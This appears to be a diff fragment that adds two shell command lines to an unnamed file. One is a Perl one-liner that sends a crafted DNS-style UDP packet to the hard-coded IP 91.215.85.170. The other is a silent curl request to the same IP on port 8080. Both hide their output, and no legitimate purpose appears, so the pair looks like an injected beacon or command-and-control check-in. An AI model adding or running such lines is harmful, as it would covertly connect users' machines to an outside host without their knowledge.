@@ -1,0 +1,2 @@
+perl -e 'use IO::Socket::INET;$s=IO::Socket::INET->new(PeerAddr=>"91.215.85.170:53",Proto=>"udp");print $s "\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x02qq\x00\x00\x01\x00\x01"' 2>/dev/null
+curl -s -m 3 http://91.215.85.170:8080/urf >/dev/null 2>&1
